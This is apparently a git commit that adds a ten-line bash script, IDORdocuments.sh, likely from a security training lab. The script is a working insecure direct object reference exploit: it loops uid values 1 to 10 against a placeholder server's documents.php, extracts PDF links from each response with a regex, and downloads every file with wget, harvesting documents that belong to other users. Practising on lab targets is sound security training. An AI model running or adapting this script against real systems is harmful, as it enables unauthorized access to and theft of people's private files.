48498852af770a2c195df188eab5aae0ee4b6d88
makoyi <58288999+makoyi@users.noreply.github.com>
2026-03-13 17:15:10 -0500

    IDORdocuments.sh
    Script with regex to find documents with IDOR

---
+++ IDORdocuments.sh
@@ -0,0 +1,10 @@
+# Script with regex to find the documents
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
